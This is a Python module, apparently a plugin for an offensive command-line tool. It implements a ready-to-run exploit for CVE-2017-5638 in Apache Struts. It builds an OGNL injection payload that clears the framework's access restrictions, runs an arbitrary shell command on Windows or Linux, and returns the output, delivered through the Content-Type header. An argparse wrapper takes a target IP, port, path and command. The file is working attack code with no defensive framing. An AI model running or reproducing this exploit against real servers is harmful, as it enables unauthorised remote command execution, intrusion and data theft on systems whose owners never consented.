from ..commands import Command
import requests
import shlex
import argparse

def exploit(url: str, cmd: str) -> str:
    payload = "%{(#_='multipart/form-data')."
    payload += "(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."
    payload += "(#_memberAccess?"
    payload += "(#_memberAccess=#dm):"
    payload += "((#container=#context['com.opensymphony.xwork2.ActionContext.container'])."
    payload += "(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))."
    payload += "(#ognlUtil.getExcludedPackageNames().clear())."
    payload += "(#ognlUtil.getExcludedClasses().clear())."
    payload += "(#context.setMemberAccess(#dm))))."
    payload += "(#cmd='%s')." % cmd
    payload += "(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win')))."
    payload += "(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd}))."
    payload += "(#p=new java.lang.ProcessBuilder(#cmds))."
    payload += "(#p.redirectErrorStream(true)).(#process=#p.start())."
    payload += "(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))."
    payload += "(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros))."
    payload += "(#ros.flush())}"

    try:
        headers = {
            'User-Agent': 'Mozilla/5.0',
            'Content-Type': payload
        }
        response = requests.get(url, headers=headers)
        return response.text
    except Exception as e:
        return str(e)

class Struts(Command):
    """
    Exploit CVE-2017-5638 Apache Struts RCE.
    Usage: struts -i <target_ip> -p <port> -u <path> -c <command>
    Example: struts -i 192.168.1.10 -p 8080 -u /struts2-showcase/index.action -c whoami
    """

    def do_command(self, lines: str):
        parser = argparse.ArgumentParser()
        parser.add_argument("--ip", "-i", type=str, required=True, help="Target IP")
        parser.add_argument("--port", "-p", type=int, default=8080, help="Target port")
        parser.add_argument("--url", "-u", type=str, default="/struts2-showcase/index.action", help="Target path")
        parser.add_argument("--cmd", "-c", type=str, default="whoami", help="Command to run")

        args = parser.parse_args(shlex.split(lines))
        
        full_url = f"http://{args.ip}:{args.port}{args.url}"
        print(f"[*] Targeting: {full_url}")
        print(f"[*] Command: {args.cmd}")

        output = exploit(full_url, args.cmd)

        if output.strip():
            print("[+] Output:")
            print(output)
        else:
            print("[-] No output — may not be vulnerable or wrong path")

command = Struts
